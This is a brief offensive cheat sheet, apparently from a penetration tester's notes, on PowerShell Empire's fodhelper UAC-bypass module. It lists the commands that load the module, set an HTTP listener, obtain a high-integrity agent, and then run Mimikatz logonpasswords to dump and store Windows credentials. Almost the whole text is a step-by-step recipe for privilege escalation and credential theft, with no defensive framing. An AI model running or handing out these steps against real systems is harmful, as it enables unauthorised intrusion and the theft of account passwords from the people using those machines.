## fodhelper

* if you have local admin access, this module may be able to launch a high-integrity PowerShell Empire agent through bypassing the UAC (which you need to run Mimikatz, etc...)

```
# load the Empire module
usemodule privesc/bypassuac_fodhelper

# display info
info

# setup a listener
set Listener http

# run the module
execute

# if this works, then you now have a high-integrity Powershell Empire agent which
# is needed in order to run Mimikatz and other high-integrity modules
usemodule credentials/mimikatz/logonpasswords
execute
sekurlsa::logonpasswords

# view the creds that were just dumped
creds

# add your own creds to creds
creds add example.com exampleusername ex4mpl3p4ssw0rd
```
